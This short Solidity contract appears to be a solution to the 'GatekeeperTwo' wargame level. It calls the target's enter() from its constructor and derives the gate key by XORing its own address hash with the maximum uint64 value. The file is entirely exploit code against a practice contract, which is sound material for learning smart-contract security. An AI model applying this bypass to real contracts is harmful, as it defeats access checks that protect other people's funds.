// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address gatekeeperAddr) {
        bytes8 front = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 key = front ^ bytes8(type(uint64).max);
        require(IGatekeeperTwo(gatekeeperAddr).enter(key), "Enter failed");
    }
}